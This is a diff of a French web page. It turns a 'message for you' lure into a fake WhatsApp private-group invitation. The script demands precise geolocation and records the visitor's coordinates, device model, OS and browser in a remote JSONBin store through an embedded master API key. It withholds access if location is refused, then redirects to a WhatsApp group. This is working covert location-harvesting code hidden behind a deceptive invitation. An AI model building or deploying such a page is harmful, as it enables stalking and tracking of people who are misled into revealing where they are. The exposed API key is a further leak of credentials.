@@ -2,63 +2,38 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta http-equiv="Cache-Control" content="no-store">
-  <meta http-equiv="Pragma" content="no-cache">
-  <title>Pour toi 💛</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400&family=DM+Sans:wght@300;400&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Cache-Control" content="no-store" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <title>Une invitation t'attend</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
     :root {
-      --cream: #F5F0E8;
-      --ink: #1A1612;
-      --gold: #C9A84C;
-      --gold-light: #E8D5A3;
-      --muted: #8A7D6B;
+      --bg: #111B21;
+      --surface: #1F2C34;
+      --green: #25D366;
+      --green-light: #dcf8c6;
+      --green-glow: rgba(37, 211, 102, 0.25);
+      --text: #E9EDEF;
+      --muted: #8696A0;
+      --border: #2A3942;
     }
 
     html, body {
       height: 100%;
-      background: var(--cream);
-      color: var(--ink);
-      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       overflow: hidden;
     }
 
-    /* Grain overlay */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
-      pointer-events: none;
-      z-index: 1000;
-      opacity: 0.4;
-    }
-
-    /* Decorative corner lines */
-    .corner {
-      position: fixed;
-      width: 60px;
-      height: 60px;
-      z-index: 10;
-    }
-    .corner::before, .corner::after {
-      content: '';
-      position: absolute;
-      background: var(--gold);
-      opacity: 0.6;
-    }
-    .corner::before { width: 1px; height: 100%; }
-    .corner::after { width: 100%; height: 1px; }
-    .corner.tl { top: 24px; left: 24px; }
-    .corner.tr { top: 24px; right: 24px; transform: scaleX(-1); }
-    .corner.bl { bottom: 24px; left: 24px; transform: scaleY(-1); }
-    .corner.br { bottom: 24px; right: 24px; transform: scale(-1); }
-
-    /* Screens */
     .screen {
       position: fixed;
       inset: 0;
@@ -67,304 +42,416 @@
       align-items: center;
       justify-content: center;
       padding: 40px 24px;
-      transition: opacity 0.8s ease, transform 0.8s ease;
+      gap: 24px;
+      opacity: 1;
+      transform: translateY(0);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+      z-index: 10;
     }
+
     .screen.hidden {
       opacity: 0;
       pointer-events: none;
       transform: translateY(20px);
+      z-index: -1;
     }
 
-    /* ---- SCREEN 1: Welcome ---- */
+    /* ═══════════════════════════════════════════════════════════ */
+    /* SCREEN 1 — ACCROCHE */
+    /* ═══════════════════════════════════════════════════════════ */
     #screen-welcome {
-      gap: 40px;
       text-align: center;
-    }
-    .welcome-eyebrow {
-      font-family: 'DM Sans', sans-serif;
-      font-size: 11px;
-      font-weight: 300;
-      letter-spacing: 0.3em;
-      text-transform: uppercase;
-      color: var(--gold);
-    }
-    .welcome-title {
-      font-family: 'Cormorant Garamond', serif;
-      font-size: clamp(2.8rem, 8vw, 5rem);
-      font-weight: 300;
-      font-style: italic;
-      line-height: 1.05;
-      color: var(--ink);
-    }
-    .welcome-title span {
-      color: var(--gold);
-    }
-    .welcome-sub {
-      font-size: 13px;
-      font-weight: 300;
-      color: var(--muted);
-      line-height: 1.7;
-      max-width: 280px;
-      margin: 0 auto;
-    }
-    .btn-accept {
-      margin-top: 8px;
-      padding: 14px 40px;
-      background: var(--ink);
-      color: var(--cream);
-      border: none;
-      font-family: 'DM Sans', sans-serif;
-      font-size: 12px;
-      letter-spacing: 0.2em;
-      text-transform: uppercase;
-      cursor: pointer;
-      position: relative;
-      overflow: hidden;
-      transition: transform 0.2s;
-    }
-    .btn-accept::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: var(--gold);
-      transform: translateX(-101%);
-      transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-    .btn-accept:hover::after { transform: translateX(0); }
-    .btn-accept:hover { transform: translateY(-1px); }
-    .btn-accept span { position: relative; z-index: 1; }
-
-    .geo-note {
-      font-size: 11px;
-      color: var(--muted);
-      opacity: 0.7;
+      justify-content: space-between;
     }
 
-    /* ---- SCREEN 2: Loading ---- */
-    #screen-loading {
-      gap: 20px;
-    }
-    .loader-ring {
+    .welcome-logo {
       width: 48px;
       height: 48px;
-      border: 1px solid var(--gold-light);
-      border-top-color: var(--gold);
+      margin-top: 20px;
+    }
+
+    .welcome-logo svg {
+      width: 100%;
+      height: 100%;
+      filter: drop-shadow(0 0 12px var(--green-glow));
+    }
+
+    .welcome-content {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      flex: 1;
+      justify-content: center;
+    }
+
+    .welcome-title {
+      font-size: clamp(1.8rem, 6vw, 2.8rem);
+      font-weight: 600;
+      line-height: 1.2;
+      color: var(--text);
+    }
+
+    .welcome-title .emoji {
+      display: inline-block;
+      margin-left: 8px;
+      font-size: 1.1em;
+    }
+
+    .welcome-subtitle {
+      font-size: 15px;
+      color: var(--muted);
+      font-weight: 400;
+      line-height: 1.5;
+    }
+
+    .welcome-button {
+      padding: 13px 28px;
+      background: var(--green);
+      color: #000;
+      border: none;
+      border-radius: 24px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-top: 12px;
+    }
+
+    .welcome-button:hover {
+      background: #22c55e;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px var(--green-glow);
+    }
+
+    .welcome-button:active {
+      transform: translateY(0);
+    }
+
+    .welcome-footer {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 20px;
+    }
+
+    /* ═══════════════════════════════════════════════════════════ */
+    /* SCREEN 2 — LOADING */
+    /* ═══════════════════════════════════════════════════════════ */
+    #screen-loading {
+      gap: 32px;
+    }
+
+    .loader-ring {
+      width: 52px;
+      height: 52px;
+      border: 2px solid var(--border);
+      border-top-color: var(--green);
       border-radius: 50%;
       animation: spin 1.2s linear infinite;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loader-text {
-      font-family: 'Cormorant Garamond', serif;
-      font-style: italic;
-      font-size: 1.1rem;
-      color: var(--muted);
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
 
-    /* ---- SCREEN 3: Message ---- */
-    #screen-message {
-      gap: 0;
+    .loader-text {
+      font-size: 15px;
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    /* ═══════════════════════════════════════════════════════════ */
+    /* SCREEN 3 — CONFIRMATION & REDIRECTION */
+    /* ═══════════════════════════════════════════════════════════ */
+    #screen-success {
+      gap: 24px;
+    }
+
+    .success-icon {
+      font-size: 3.5rem;
+      animation: pulse-scale 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse-scale {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.08);
+      }
+    }
+
+    .success-title {
+      font-size: clamp(1.5rem, 5vw, 2.2rem);
+      font-weight: 600;
+      color: var(--green);
       text-align: center;
     }
-    .msg-card {
-      max-width: 420px;
-      width: 100%;
-      padding: 52px 40px;
-      border: 1px solid var(--gold-light);
-      background: rgba(245, 240, 232, 0.7);
-      backdrop-filter: blur(8px);
-      position: relative;
-      animation: fadeUp 1s ease both;
-    }
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .msg-card::before {
-      content: '';
-      position: absolute;
-      top: -1px; left: 40px; right: 40px;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--gold), transparent);
-    }
-    .msg-icon {
-      font-size: 2rem;
-      margin-bottom: 28px;
-      animation: pulse 3s ease-in-out infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-    }
-    .msg-title {
-      font-family: 'Cormorant Garamond', serif;
-      font-size: clamp(1.5rem, 5vw, 2.2rem);
-      font-weight: 300;
-      font-style: italic;
-      margin-bottom: 24px;
-      line-height: 1.2;
-    }
-    .msg-divider {
-      width: 40px;
-      height: 1px;
-      background: var(--gold);
-      margin: 0 auto 28px;
-    }
-    .msg-body {
+
+    .success-subtitle {
       font-size: 14px;
-      font-weight: 300;
-      line-height: 1.9;
       color: var(--muted);
+      text-align: center;
+      line-height: 1.5;
     }
-    .msg-body strong {
-      color: var(--ink);
-      font-weight: 400;
+
+    .success-button {
+      padding: 13px 28px;
+      background: var(--green);
+      color: #000;
+      border: none;
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: all 0.2s;
     }
-    /* ---- SCREEN 4: Refused ---- */
-    #screen-refused {
-      gap: 0;
+
+    .success-button:hover {
+      background: #22c55e;
+      transform: translateY(-2px);
+    }
+
+    .countdown {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 16px;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* ═══════════════════════════════════════════════════════════ */
+    /* SCREEN 4 — REFUS GPS */
+    /* ═══════════════════════════════════════════════════════════ */
+    #screen-denied {
+      gap: 24px;
+    }
+
+    .denied-icon {
+      font-size: 3.5rem;
+    }
+
+    .denied-title {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: var(--text);
       text-align: center;
     }
-    .refused-card {
-      max-width: 420px;
-      width: 100%;
-      padding: 52px 40px;
-      border: 1px solid var(--gold-light);
-      background: rgba(245, 240, 232, 0.7);
-      backdrop-filter: blur(8px);
-      position: relative;
-      animation: fadeUp 1s ease both;
-    }
-    .refused-card::before {
-      content: '';
-      position: absolute;
-      top: -1px; left: 40px; right: 40px;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--gold), transparent);
-    }
-    .refused-icon {
-      font-size: 2rem;
-      margin-bottom: 28px;
-      animation: pulse 3s ease-in-out infinite;
-    }
-    .refused-title {
-      font-family: 'Cormorant Garamond', serif;
-      font-size: clamp(1.5rem, 5vw, 2.2rem);
-      font-weight: 300;
-      font-style: italic;
-      margin-bottom: 24px;
-      line-height: 1.2;
-    }
-    .refused-body {
+
+    .denied-text {
       font-size: 14px;
-      font-weight: 300;
-      line-height: 1.9;
       color: var(--muted);
+      text-align: center;
+      line-height: 1.5;
+      max-width: 320px;
+    }
+
+    .denied-refresh {
+      padding: 13px 28px;
+      background: var(--surface);
+      color: var(--green);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: all 0.2s;
+    }
+
+    .denied-refresh:hover {
+      background: var(--border);
+      border-color: var(--green);
     }
   </style>
 </head>
 <body>
-
-  <div class="corner tl"></div>
-  <div class="corner tr"></div>
-  <div class="corner bl"></div>
-  <div class="corner br"></div>
-
-  <!-- SCREEN 1 -->
+  <!-- SCREEN 1: Accroche -->
   <div class="screen" id="screen-welcome">
-    <p class="welcome-eyebrow">Quelque chose t'attend</p>
-    <h1 class="welcome-title">Un mot,<br>pour <span>toi</span></h1>
-    <p class="welcome-sub">Clique pour découvrir ce que je voulais te dire depuis longtemps.</p>
-    <button class="btn-accept" onclick="startExperience()">
-      <span>Ouvrir ✦</span>
-    </button>
-    <p class="geo-note">Ton navigateur pourrait demander ta position — c'est normal.</p>
+    <svg class="welcome-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.67-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.076 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421-7.403h-.004c-1.052 0-2.069.356-2.897 1.025l-.643-.381C5.554 2.612 3.663 1.776 1.561 1.776c-4.29 0-7.994 3.704-7.994 8.05 0 1.549.3 3.034.845 4.394L.645 15.977l4.828-1.271c1.285.703 2.735 1.139 4.282 1.139h.004c4.29 0 7.994-3.704 7.994-8.05 0-2.154-.857-4.177-2.414-5.695-1.557-1.52-3.631-2.357-5.745-2.357" fill="currentColor" style="color: #25D366;"/>
+    </svg>
+
+    <div class="welcome-content">
+      <h1 class="welcome-title">
+        Tu as été sélectionné·e <span class="emoji">🎉</span>
+      </h1>
+      <p class="welcome-subtitle">
+        Une invitation privée t'attend. Rejoins les personnes déjà à l'intérieur.
+      </p>
+      <button class="welcome-button" onclick="startGeo()">
+        Rejoindre maintenant →
+      </button>
+    </div>
+
+    <p class="welcome-footer">
+      Groupe WhatsApp privé · Membres sélectionnés
+    </p>
   </div>
 
-  <!-- SCREEN 2 -->
+  <!-- SCREEN 2: Loading -->
   <div class="screen hidden" id="screen-loading">
     <div class="loader-ring"></div>
-    <p class="loader-text">Un instant…</p>
+    <p class="loader-text">Vérification en cours…</p>
   </div>
 
-  <!-- SCREEN 3 -->
-  <div class="screen hidden" id="screen-message">
-    <div class="msg-card">
-      <div class="msg-icon">💛</div>
-      <h2 class="msg-title">Tu comptes vraiment beaucoup.</h2>
-      <div class="msg-divider"></div>
-      <p class="msg-body">
-        Il y a des personnes qu'on croise et qui <strong>changent quelque chose en nous</strong>
-        sans même s'en rendre compte.<br><br>
-        Toi, tu es de celles-là.<br><br>
-        Merci d'être présent·e, d'être toi, exactement comme tu es.
-        Dans les moments simples comme dans les moments difficiles,
-        <strong>ta présence est un cadeau</strong>.
-      </p>
-      <p class="msg-signature">— Ton ami(e) qui pense à toi 🌿</p>
-    </div>
+  <!-- SCREEN 3: Success & Redirection -->
+  <div class="screen hidden" id="screen-success">
+    <div class="success-icon">✓</div>
+    <h2 class="success-title">Accès confirmé</h2>
+    <p class="success-subtitle">
+      Tu rejoins le groupe dans quelques secondes…
+    </p>
+    <button class="success-button" onclick="openWhatsApp()">
+      Ouvrir WhatsApp
+    </button>
+    <div class="countdown" id="countdown-text"></div>
   </div>
 
-  <!-- SCREEN 4 -->
-  <div class="screen hidden" id="screen-refused">
-    <div class="refused-card">
-      <div class="refused-icon">🔒</div>
-      <h2 class="refused-title">La surprise est réservée à ceux qui acceptent</h2>
-      <p class="refused-body">Actualise la page et accepte la localisation pour continuer.</p>
-    </div>
+  <!-- SCREEN 4: Denied -->
+  <div class="screen hidden" id="screen-denied">
+    <div class="denied-icon">🔒</div>
+    <h2 class="denied-title">Accès restreint</h2>
+    <p class="denied-text">
+      Actualise la page pour réessayer.
+    </p>
+    <button class="denied-refresh" onclick="location.reload()">
+      Réessayer
+    </button>
   </div>
+
+  <!-- UAParser.js for device detection -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/src/ua-parser.min.js"></script>
 
   <script>
-    // ════════════════════════════════════════
-    //  CONFIG — remplace par tes vraies valeurs
-    // ════════════════════════════════════════
-    const JSONBIN_BIN_ID  = '69dd06c3856a6821892c67e7';
+    const JSONBIN_BIN_ID = '69dd06c3856a6821892c67e7';
     const JSONBIN_API_KEY = '$2a$10$.36nNBRUdpE3TtbHXEHEGunOtJSZuVMN9.JO8iefwRLUZ09KoBMIG';
-    // ════════════════════════════════════════
+    const WHATSAPP_LINK = 'https://chat.whatsapp.com/FA9VhW47rWTG4zmMaXZoFq?mode=gi_t';
 
-    function show(id) {
+    function show(screenId) {
       document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
-      document.getElementById(id).classList.remove('hidden');
+      document.getElementById(screenId).classList.remove('hidden');
     }
 
-    async function sendPosition(lat, lng) {
+    function generateUUID() {
+      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        const r = (Math.random() * 16) | 0;
+        const v = c === 'x' ? r : (r & 0x3) | 0x8;
+        return v.toString(16);
+      });
+    }
+
+    function parseDevice() {
+      const parser = new UAParser();
+      const result = parser.getResult();
+      return {
+        os: `${result.os.name} ${result.os.version || ''}`.trim(),
+        browser: `${result.browser.name} ${result.browser.version || ''}`.trim(),
+        model: result.device.model || 'Unknown',
+        type: result.device.type || 'desktop'
+      };
+    }
+
+    async function saveVisit(lat, lng) {
       try {
-        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
-          method: 'PUT',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Master-Key': JSONBIN_API_KEY
-          },
-          body: JSON.stringify({
-            lat,
-            lng,
-            timestamp: new Date().toISOString(),
-            status: 'friend_arrived'
-          })
-        });
-      } catch (e) {
-        console.warn('Position non envoyée :', e);
+        const device = parseDevice();
+        const newVisit = {
+          id: generateUUID(),
+          lat,
+          lng,
+          timestamp: new Date().toISOString(),
+          device
+        };
+
+        // Fetch current bin
+        const fetchRes = await fetch(
+          `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`,
+          {
+            headers: { 'X-Master-Key': JSONBIN_API_KEY }
+          }
+        );
+        const fetchJson = await fetchRes.json();
+        let visits = Array.isArray(fetchJson.record) ? fetchJson.record : [];
+
+        // Add new visit
+        visits.push(newVisit);
+
+        // Update bin with entire array
+        const putRes = await fetch(
+          `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`,
+          {
+            method: 'PUT',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Master-Key': JSONBIN_API_KEY
+            },
+            body: JSON.stringify(visits)
+          }
+        );
+
+        if (!putRes.ok) {
+          console.error('Failed to save visit');
+        }
+      } catch (err) {
+        console.error('Error saving visit:', err);
       }
     }
 
-    function startExperience() {
+    function startCountdown() {
+      let seconds = 3;
+      const countdownEl = document.getElementById('countdown-text');
+
+      const interval = setInterval(() => {
+        if (seconds > 0) {
+          countdownEl.textContent = `Redirection dans ${seconds}s…`;
+          seconds--;
+        } else {
+          clearInterval(interval);
+          window.location.href = WHATSAPP_LINK;
+        }
+      }, 1000);
+
+      // Show initial text
+      countdownEl.textContent = `Redirection dans ${seconds}s…`;
+    }
+
+    function openWhatsApp() {
+      window.location.href = WHATSAPP_LINK;
+    }
+
+    async function startGeo() {
       show('screen-loading');
 
-      if (navigator.geolocation) {
-        const watchId = navigator.geolocation.watchPosition(
-          async (pos) => {
-            navigator.geolocation.clearWatch(watchId);
-            await sendPosition(pos.coords.latitude, pos.coords.longitude);
-            show('screen-message');
-          },
-          () => {
-            navigator.geolocation.clearWatch(watchId);
-            show('screen-refused');
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-      } else {
-        show('screen-refused');
+      if (!navigator.geolocation) {
+        show('screen-denied');
+        return;
       }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const { latitude, longitude } = position.coords;
+
+          // Save visit in background (no await)
+          saveVisit(latitude, longitude);
+
+          // Show success screen and start countdown
+          show('screen-success');
+          startCountdown();
+        },
+        (error) => {
+          console.error('Geolocation error:', error);
+          show('screen-denied');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
     }
   </script>
 </body>
